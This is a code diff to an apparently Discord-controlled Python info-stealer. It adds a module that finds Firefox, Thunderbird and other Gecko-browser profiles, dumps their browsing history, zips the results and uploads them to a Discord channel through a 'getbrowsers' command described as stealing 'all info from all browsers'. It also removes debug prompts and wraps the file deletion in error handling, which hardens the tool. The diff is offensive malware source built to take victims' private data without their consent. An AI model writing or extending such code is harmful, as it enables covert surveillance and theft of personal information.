@@ -106,6 +106,14 @@ class utils:
         
         return None
     
+    def get_all_folders(folder_path):
+        folders = []
+        for entry in os.listdir(folder_path):
+            full_path = os.path.join(folder_path, entry)
+            if os.path.isdir(full_path):
+                folders.append(full_path)
+        return folders
+    
     def find_localappdata():
         drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
         localappdata_paths = []
@@ -415,8 +423,6 @@ class getinfo:
                     pass
 
                 if name in ['OperaGX', 'Opera']:   
-                    input('OPERAS') 
-                    input(history_path)
                     conn = sqlite3.connect(history_path)
                     cursor = conn.cursor()
                     cursor.execute('SELECT url, title, last_visit_time FROM urls')
@@ -439,11 +445,9 @@ class getinfo:
                     conn.close()
                     output.close()
                 else:
-                    input('NON OPERAS')
                     for profile in self.profiles:
                         try:
                             history_path = os.path.join(browser_path, profile, 'History')
-                            input(history_path)
                             conn = sqlite3.connect(history_path)
                             cursor = conn.cursor()
                             cursor.execute('SELECT url, title, last_visit_time FROM urls')
@@ -470,39 +474,77 @@ class getinfo:
 
 
 
-    def gecko():
-        # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
-        paths = {
-            "Firefox":     "Mozilla\\Firefox\\Profiles",
-            "SeaMonkey":   "Mozilla\\SeaMonkey\\Profiles",
-            "Waterfox":    "Waterfox\\Profiles",
-            "K-Meleon":    "K-Meleon\\Profiles",
-            "Thunderbird": "Thunderbird\\Profiles",
-            "IceDragon":   "Comodo\\IceDragon\\Profiles",
-            "Cyberfox":    "8pecxstudios\\Cyberfox\\Profiles",
-            "BlackHaw":    "NETGATE Technologies\\BlackHaw\\Profiles",
-            "Pale Moon":   "Moonchild Productions\\Pale Moon\\Profiles",
-            "Mercury":     "mercury\\Profiles",
-            "Librewolf":   "librewolf\\Profiles",
-        }
+    class gecko:
+        def __init__(self) -> None:
+            # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
+            self.paths = {
+                "Firefox":     "Mozilla\\Firefox\\Profiles",
+                "SeaMonkey":   "Mozilla\\SeaMonkey\\Profiles",
+                "Waterfox":    "Waterfox\\Profiles",
+                "K-Meleon":    "K-Meleon\\Profiles",
+                "Thunderbird": "Thunderbird\\Profiles",
+                "IceDragon":   "Comodo\\IceDragon\\Profiles",
+                "Cyberfox":    "8pecxstudios\\Cyberfox\\Profiles",
+                "BlackHaw":    "NETGATE Technologies\\BlackHaw\\Profiles",
+                "Pale Moon":   "Moonchild Productions\\Pale Moon\\Profiles",
+                "Mercury":     "mercury\\Profiles",
+            }
 
-        os.makedirs(os.path.join(TEMP, 'gecko_browsers'), exist_ok=True)
+            self.validpaths = []
+            self.mainfolder = os.path.join(TEMP, 'gecko_browsers')
+            self.roamingappdatapaths = utils.find_roamingappdata()
+            self.find_all()
 
-        all_valid_paths = []
-        localappdatapaths = utils.find_localappdata()
+        def convert_time(self, timestamp):
+            epoch_start = datetime(1601, 1, 1)
+            return epoch_start + timedelta(microseconds=timestamp)
 
-        for localappdatapath in localappdatapaths:
-            for name, browser_path in paths.items():
-                path = os.path.join(localappdatapath, browser_path)
-                validpath = utils.search_disks_for_folder(path)
-                if validpath != None:
-                    all_valid_paths.append((name, validpath))   
+        def remove_url_params(self, url):
+            parsed_url = urlparse(url)
+            return urlunparse(parsed_url._replace(query='', fragment=''))
 
-        mainfolder = os.path.join(TEMP, 'gecko_browsers')
-        os.makedirs(mainfolder, exist_ok=True)
+        def find_all(self):
+            for localappdatapath in self.roamingappdatapaths:
+                for name, browser_path in self.paths.items():
+                    path = os.path.join(localappdatapath, browser_path)
+                    validpath = utils.search_disks_for_folder(path)
+                    if validpath != None:
+                        self.validpaths.append((name, validpath))  
 
-        for name, browser_path in all_valid_paths:
-            os.makedirs(os.path.join(mainfolder, name), exist_ok=True)
+            os.makedirs((self.mainfolder), exist_ok=True)
+
+            for name, browser_path in self.validpaths:
+                os.makedirs(os.path.join(self.mainfolder, name), exist_ok=True)     
+
+        def get_history(self):
+            for name, browser_path in self.validpaths:
+                profiles = utils.get_all_folders(browser_path)
+                for profilepath in profiles:
+                    try:
+                        history_path = os.path.join(profilepath, 'places.sqlite')
+                        conn = sqlite3.connect(history_path)
+                        cursor = conn.cursor()
+                        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+                        rows = cursor.fetchall()
+
+                        output_path = os.path.join(self.mainfolder, name, f'History_{utils.get_string(5)}.txt')
+                        url_width = 100
+                        title_width = 100
+                        last_visit_width = 30
+
+                        output = open(output_path, 'w', encoding='utf-8')
+                        output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
+                        output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
+                        for row in rows:
+                            url = self.remove_url_params(row[0])
+                            title = row[1]
+                            visit_time = self.convert_time(row[2])
+                            output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
+
+                        conn.close()
+                        output.close()
+                    except:
+                        pass
 
 client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
 
@@ -620,6 +662,8 @@ getbrowsers ▶ steal all info from all browsers
 
                     elif message.content == f'{prefix}getbrowsers':
                         await message.delete()
+
+                        # CHROMIUM
                         chromium = getinfo.chromium()
                         chromium.get_history()
                         chromiumfolder = os.path.join(TEMP, 'chromium_browsers')
@@ -632,8 +676,41 @@ getbrowsers ▶ steal all info from all browsers
                         tree = utils.generate_tree(chromiumfolder)
                         await message.channel.send(f'```{tree}```')
                         await message.channel.send(file=discord.File(zip_dist))
-                        os.remove(zip_dist)
-                        os.remove(chromiumfolder)
+
+                        try:
+                            os.remove(zip_dist)
+                        except:
+                            pass
+
+                        try:
+                            os.remove(chromiumfolder)
+                        except:
+                            pass
+
+
+                        # GECKO
+                        gecko = getinfo.gecko()
+                        gecko.get_history()
+                        geckofolder = os.path.join(TEMP, 'gecko_browsers')
+
+                        zip_dist = os.path.join(TEMP, f'temp{utils.get_string(5)}.zip')
+
+                        with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                            utils.zip(geckofolder, zipf)
+
+                        tree = utils.generate_tree(geckofolder)
+                        await message.channel.send(f'```{tree}```')
+                        await message.channel.send(file=discord.File(zip_dist))
+
+                        try:
+                            os.remove(zip_dist)
+                        except:
+                            pass
+
+                        try:
+                            os.remove(geckofolder)
+                        except:
+                            pass
 
                     elif message.content == f'{prefix}cls':
                         await message.delete()
